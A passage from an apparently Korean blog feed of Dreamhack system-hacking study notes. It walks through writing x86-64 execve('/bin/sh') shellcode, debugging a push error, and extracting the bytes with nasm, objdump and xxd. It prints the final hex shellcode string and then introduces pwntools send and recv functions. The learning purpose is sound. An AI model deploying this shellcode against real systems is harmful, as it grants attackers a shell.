&lt;span class=&quot;s&quot;&gt;&quot;push 0x68732f6e69622f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rdi, rsp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;xor rsi, rsi&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;xor rdx, rdx&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rax, 0x3b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;syscall&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;&quot;xor rdi, rdi&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rax, 0x3c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;syscall&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run_sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;run_sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;결과는 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%203.jpeg&quot; alt=&quot;거짓말처럼 에러가 떴다.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;거짓말처럼 에러가 떴다.&lt;/p&gt;

&lt;p&gt;아니 대체… push에 들어갈 수 있는 operand type이 아니란다. 대체 왜인지 알아보았다. 그랬더니 충격적인 사실을 알게 되었다.&lt;/p&gt;

&lt;p&gt;push가 한 번 실행될 때 operand에 오는 값은 일반적으로 주소를 상정한다. 즉, 특정 값을 직접 넣는 게 아니라 특정 값의 포인터를 넣는 것이 push의 대전제였던 것이다. 그래서 immediate value를 스택에 넣는 것은 권장되지 않는 방식이었고, 어떤 값을 다른 메모리 주소나 레지스터에 넣어둔 후 스택에 데이터가 있는 위치를 push 하는 것이 convention이었다. 또한 현재 사용한 어셈블러에서 허용하는 push의 operand의 최대 길이는 32bit였다. (일반적인 어셈블러가 그렇기 때문에 이 점은 추측했다)&lt;/p&gt;

&lt;p&gt;궁금해서 데이터를 8bit씩 나누어 넣어 보았다. 그 결과, gdb를 통해 아래와 같은 실행 현황을 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%204.jpeg&quot; alt=&quot;ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ아놔&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ아놔&lt;/p&gt;

&lt;p&gt;들어가긴 들어간다. 그렇지만 내가 의도하는 스트링으로 인식되지는 않는다!!!!!&lt;/p&gt;

&lt;p&gt;실제로 문자열의 시작 주소가 들어가게 만들어 둔 rdi의 값을 확인해 보니 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%205.jpeg&quot; alt=&quot;잘라서 인식한다!!!!!!!!!!!&quot; /&gt;&lt;/p&gt;

&lt;p&gt;잘라서 인식한다!!!!!!!!!!!&lt;/p&gt;

&lt;p&gt;잘라서 인식한다. 머리가 나쁘면 손발이 고생한다는 격언을 경험적으로 증명할 수 있었다.&lt;/p&gt;

&lt;p&gt;누군가가 하지 않는 데엔 이유가 있는 법임을 명심하자.&lt;/p&gt;

&lt;p&gt;따라서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;push 0x68732f6e69622f\n&quot;&lt;/code&gt; 를 아래와 같이 변경하고 컴파일했다.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;&quot;mov rax, 0x68732f6e69622f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;push rax&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%206.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;익스플로잇에 성공할 수 있었다. 아이기뻐.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;objdump를-이용한-shellcode-추출&quot;&gt;objdump를 이용한 shellcode 추출&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;어셈블리어로 작성한 셸코드를 byte code로 변환하는 과정이다.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;nasm이라는 라이브러리를 설치해 진행할 수 있다.&lt;/p&gt;

    &lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;apt-get&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;install&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nasm&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nasm&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;execve.asm&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;objdump&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;execve.o&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;직전의 execve에 사용했던 셸코드를 독립적인 어셈블리 코드로 작성할 수 있게 수정해 execve.asm으로 저장했다.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%207.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;위 커맨드를 실행한 결과(elf 형식의 오브젝트 코드로 변환된 대상 코드의 덤프를 뜬 결과):&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%208.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;이렇게 생성한 오브젝트 코드를 이제 정말로 바이트 코드로 바꿔주고, 해당 코드의 내용을 터미널에 표시한다.&lt;/p&gt;

        &lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;objcopy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--dump-section&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execve.bin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;execve.o&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xxd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;execve.bin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xxd:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;파일의&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;내용을&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;진수로&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;보여준다&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;

        &lt;p&gt;그 결과 아래와 같은 값을 확인할 수 있었고, 출력 내용의 포맷을 없애는 옵션을 달아 당장 복사해 사용할 수 있는 hex 값을 출력하도록 하기도 했다.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%209.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

        &lt;p&gt;즉, execve.bin 쉘코드의 바이너리 값은&lt;/p&gt;

        &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;“\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05”&lt;/code&gt;&lt;/p&gt;

        &lt;p&gt;였다.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Wed, 20 Jul 2022 19:24:23 +0900</pubDate>
        <link>http://localhost:4000/blog/dreamhack_system_hacking/step4-1</link>
        <guid isPermaLink="true">http://localhost:4000/blog/dreamhack_system_hacking/step4-1</guid>
      </item>
    
      <item>
        <title>System Hackig Step 3-2</title>
        <description>&lt;h1 id=&quot;stage-3-2&quot;&gt;STAGE 3-2&lt;/h1&gt;

&lt;h1 id=&quot;tool-pwntools&quot;&gt;Tool: PwnTools&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;파이썬을 이용해 익스플로잇을 수행할 때, 자주 사용하는 함수들이 있음. 예시) 리틀 엔디언 ↔ 빅 엔디언을 수행하는 함수&lt;/li&gt;
  &lt;li&gt;이런 함수들을 미리 구현해 둔 모듈을 만듦 → ‘pwntools’의 탄생&lt;/li&gt;
  &lt;li&gt;익스플로잇 대부분이 pwntools를 이용해 제작되고 공유되므로 반드시 알아 둬야 함.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;설치 방법은 생략한다. 인터넷에 검색하면 나오기 때문에…&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;pwntools-api-사용법&quot;&gt;PwnTools API 사용법&lt;/h1&gt;

&lt;p&gt;공식 매뉴얼: &lt;a href=&quot;http://docs.pwntools.com/en/latest/&quot;&gt;여기!&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;요즘은 매뉴얼화가 잘 되어 있기 때문에 어떤 모듈을 다운받으면 그 모듈의 매뉴얼부터 얼추 숙지해 두는 걸 추천한다. 보통은 영어로 되어 있으므로 파파고를 쓰거나, 영어 실력을 늘려서 언어 장벽을 낮추는 게 좋다.&lt;/p&gt;

&lt;p&gt;여기에서는 자주 사용되는 몇몇 함수만 간략히 소개한다.&lt;/p&gt;

&lt;h2 id=&quot;1-process--remote&quot;&gt;1. process &amp;amp; remote&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;process&lt;/code&gt; 를 이용해 전달할 수 있는 함수는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;remote&lt;/code&gt; 를 통해서도 전달 및 실행할 수 있다!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;process [&lt;a href=&quot;http://docs.pwntools.com/en/latest/tubes/processes.html&quot;&gt;자세한 설명&lt;/a&gt;]
    &lt;ul&gt;
      &lt;li&gt;로컬 바이너리를 대상으로 익스플로잇을 테스트하고 디버깅할 때 사용한다.&lt;/li&gt;
      &lt;li&gt;새로운 프로세스를 새 스레드에서 실행하면서, 커뮤니케이션이 가능한 튜브로 래핑해 둔다.&lt;/li&gt;
      &lt;li&gt;즉, process 함수가 실행된 원래 함수와는 별개의 스레드에서 원하는 프로세스를 실행하면서 원래 함수에서 전달하려는 인수나 실행된 프로세스의 결과 등을 주고받을 수 있게 해준다.&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;사용예:&lt;/p&gt;

        &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./test&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;print(&apos;this is a shellcode&apos;)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.01&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;remote [&lt;a href=&quot;http://docs.pwntools.com/en/latest/tubes/sockets.html?highlight=remote#pwnlib.tubes.remote.remote&quot;&gt;자세한 설명&lt;/a&gt;]
    &lt;ul&gt;
      &lt;li&gt;원격 서버를 대상으로 익스플로잇을 실제로 실행할 때 사용한다.&lt;/li&gt;
      &lt;li&gt;TCP나 UDP 연결을 만들어서 통신하게 해 주고, IPv4와 IPc6를 모두 지원한다.&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;사용예:&lt;/p&gt;

        &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; 
  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;example.com&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30909&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# &apos;example.com&apos;의 30909 포트에서 서비스 중인 프로세스를 대상으로 익스 수행
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;GET /&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;2-send&quot;&gt;2. send&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;데이터를 프로세스에 전송하기 위해 사용한다.&lt;/li&gt;
  &lt;li&gt;여러 variation이 있고, 각자 상황에 맞게 사용할 수 있다. [&lt;a href=&quot;http://docs.pwntools.com/en/latest/tubes.html?highlight=send#pwnlib.tubes.tube.tube.send&quot;&gt;자세한 설명&lt;/a&gt;]&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;사용예:&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./test&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# ./test에 &apos;A&apos;를 입력
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# &apos;A&apos;+&apos;\n&apos;
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;hello&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# ./test가 &apos;hello&apos;를 출력하면 &apos;A&apos;를 입력. Data로는 무조건 패킹된(스트링) 데이터가 들어가야 한다.
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;hello&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# ./test가 &apos;hello&apos;를 출력하면 &apos;A&apos;+&apos;\n&apos;을 입력
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;3-recv&quot;&gt;3. recv&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;프로세스에서 데이터를 받기 위해 사용한다.&lt;/li&gt;
  &lt;li&gt;여러 variation이 있고, 각자 상황에 맞게 사용할 수 있다. (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwnlib.tubes.process&lt;/code&gt; 의 하위에 정의된 메소드이다)
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recv()&lt;/code&gt; 와 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recvn()&lt;/code&gt; 의 차이점을 주의해야 한다!
        &lt;ul&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recv(m)&lt;/code&gt; : 최대 m 바이트를 받는 것이기 때문에, 그만큼을 받지 못해도 에러를 발생시키지 않는다.&lt;/li&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recvn(m)&lt;/code&gt; : 정확히 m 바이트의 데이터를 받는 것이기 때문에 조건을 만족시키는 데이터를 받지 못하면 계속해서 기다린다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;사용예:&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./test&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
  &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# p가 출력하는 데이터를 최대 1024 바이트까지 받을 수 있다.
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# store data printed out from p until &apos;\n&apos; comes in
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# get exactly 5 bytes of data
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;hello&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# store data printed out from p until &apos;hello&apos; comes in
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# store data printed out from p until p is terminated 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;4-packing--unpacking&quot;&gt;4. packing &amp;amp; unpacking&lt;/h2&gt;

&lt;ul&gt;
